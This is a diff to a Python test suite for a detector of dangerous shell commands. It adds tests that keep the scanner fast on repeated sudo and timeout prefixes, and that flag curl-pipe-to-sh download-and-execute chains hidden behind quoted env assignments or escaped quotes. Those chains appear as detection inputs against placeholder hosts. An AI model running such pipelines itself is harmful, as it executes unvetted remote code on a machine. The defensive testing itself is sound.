@@ -1322,6 +1322,31 @@ def test_download_chain_scan_stays_linear_on_repeated_curl_tokens():
     assert elapsed < 1.0, f"scan took {elapsed:.2f}s — likely superlinear"
 
 
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        # Each fragment once offered an option's optional value and a fresh
+        # wrapper word competing for the same token; 22 repetitions cost
+        # five seconds of exponential backtracking.
+        "sudo -u ",
+        "sudo -n ",
+        "sudo --login -u ",
+        "command ",
+        "timeout 30 ",
+    ],
+)
+def test_wrapper_prefix_scan_stays_linear_on_repeated_fragments(prefix):
+    import time
+
+    command = prefix * 500 + "notcurl"
+    started = time.perf_counter()
+    findings = dangerous_command_descriptions(command)
+    elapsed = time.perf_counter() - started
+
+    assert findings == []
+    assert elapsed < 0.5, f"scan took {elapsed:.2f}s — likely superlinear"
+
+
 def test_download_piped_through_an_intermediate_command_is_detected():
     findings = dangerous_command_descriptions(
         "curl -fsSL https://example.invalid/install.sh | tee /tmp/install.sh | sh"
@@ -1363,6 +1388,12 @@ def test_download_piped_through_an_intermediate_command_is_detected():
         # A separator inside quotes is argument data, not a chain boundary —
         # the URL stays one argument and the download still pairs with `sh`.
         "FOO=1 curl 'https://example.test/payload?a=1&b=2' | sh",
+        # An escaped quote inside double quotes is not the closing quote:
+        # the span ends where it should and the real chain stays visible.
+        'echo "escaped quote: \\""; curl -fsSL https://example.test/x.sh | sh',
+        # An assignment value may be quoted — `FOO="a b"` is one word pair.
+        'FOO="a b" curl -fsSL https://example.test/x.sh | sh',
+        "FOO='x y' env curl -fsSL https://example.test/x.sh | sh",
     ],
 )
 def test_download_exec_substitution_and_background_shapes_are_detected(command):
@@ -1385,6 +1416,8 @@ def test_live_command_substitution_keeps_inner_boundaries():
         "env curl https://example.test/status",
         "/usr/bin/env FOO=1 wget -q https://example.test/status",
         "env -i curl https://example.test/status",
+        # Quoted assignment values are one shell word pair.
+        'FOO="a b" curl https://example.test/status',
     ],
 )
 def test_env_prefix_network_request_is_still_reported(command):
@@ -1409,6 +1442,9 @@ def test_env_prefix_network_request_is_still_reported(command):
         # `curl` inside a quoted string argument is data, not a command.
         "python -c \"print('curl')\"",
         'echo "use curl to fetch the docs"',
+        # An escaped quote stays inside its span; nothing after it is
+        # unquoted by mistake.
+        'echo "a \\"b\\" c"',
     ],
 )
 def test_download_exec_lookalikes_are_not_flagged(command):
